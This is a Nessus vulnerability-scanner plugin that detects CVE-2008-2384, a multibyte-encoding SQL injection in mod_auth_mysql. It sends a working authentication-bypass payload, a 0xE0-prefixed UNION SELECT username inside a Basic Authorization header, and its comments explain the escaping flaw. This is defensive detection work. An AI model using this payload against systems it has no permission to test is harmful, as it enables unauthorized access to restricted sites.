#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(52050);
  script_version("1.11");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2008-2384");
  script_bugtraq_id(33392);
  script_xref(name:"SECUNIA", value:"33627");

  script_name(english:"Mod_auth_mysql Multibyte Encoding SQL Injection");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is running software that is vulnerable to a SQL
injection attack.");
  script_set_attribute(attribute:"description", value:
"There is a SQL injection vulnerability in this installation of
mod_auth_mysql that may allow an attacker access to restricted areas
of a website.  Successful attacks have only been demonstrated against
sites with AuthMySQLCharacterSet set to big5, gbk, and sjis but other
encodings may be affected.");
  script_set_attribute(attribute:"solution", value:
"Change to using a safe multibyte encoding (UTF-8), or patch
mod_auth_mysql to use mysql_real_escape_string.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:X");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(89);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/01/21");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/01/21");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/02/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:http_server");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2022 Tenable Network Security, Inc.");

  script_dependencies("apache_http_version.nasl");
  script_require_keys("installed_sw/Apache");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("audit.inc");
include("install_func.inc");

get_install_count(app_name:"Apache", exit_if_zero:TRUE);
port = get_http_port(default:80);
install = get_single_install(app_name:"Apache", port:port);

# Only do a small number of checks unless we're being thorough.
if (!thorough_tests)
{
  checks = 0;
  max_checks = 10;
}

# Loop through URLs that we know have authentication.
paths = get_kb_list("www/"+port+"/content/basic_auth/url/*");
if (isnull(paths)) exit(1, "No pages requiring Basic Auth were found on the Apache server listening on port "+port+".");
paths = make_list(paths);

rand_headers = make_array(
    "Authorization", "Basic " + base64(str: rand_str() + ":" + rand_str())
  );

foreach path (keys(paths))
{
  if (!thorough_tests)
  {
    if (checks >= max_checks) break;
    checks++;
  }

  path = paths[path];

  # The idea here is that this string is interpreted by MySQL in a
  # multibyte coding (which permits single-byte ASCII), but is run
  # through the function mysql_escape_string by mod_auth_mysql which
  # is not encoding aware. So we put a non-ASCII prefix before an
  # apostrophe, which mysql_escape_string escapes by adding a
  # backslash before it. The result is a two-byte (prefix + backslash)
  # character followed by an apostrophe being seen by MySQL. Past
  # that, it's standard SQL injection.
  prefix = raw_string(0xE0);
  pass = "1";
  user = "' AND 0=1 LIMIT 0 UNION SELECT " + pass + ", " + strlen(pass) + " LIMIT 1; -- ";

  headers = make_array(
    "Authorization", "Basic " + base64(str:prefix + user + ":" + pass)
  );

  res = http_send_recv3(
    method:"GET",
    item:path,
    port:port,
    exit_on_fail:TRUE,
    add_headers: headers
  );

  # Check if we got past the authentication.
  if (res[0] =~ "^HTTP/1\.[01] 200 ")
  {
    # Anti FP
    w = http_send_recv3(method:"GET", item:path, port:port, exit_on_fail:TRUE,
        add_headers: rand_headers );
    if (w[0] =~ "^HTTP/1\.[01] 200 ") continue;

    if (report_verbosity > 0)
    {
      report = 
        '\nNessus successfully bypassed authentication as follows :' +
        '\n' +
        '\n  URL      ' + build_url(port:port, qs:path) +
        '\n  Username : \\x' + hexstr(prefix) + user + 
        '\n  Password : ' + pass + '\n';
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}

audit(AUDIT_LISTEN_NOT_VULN, "Apache", port, install["version"]);
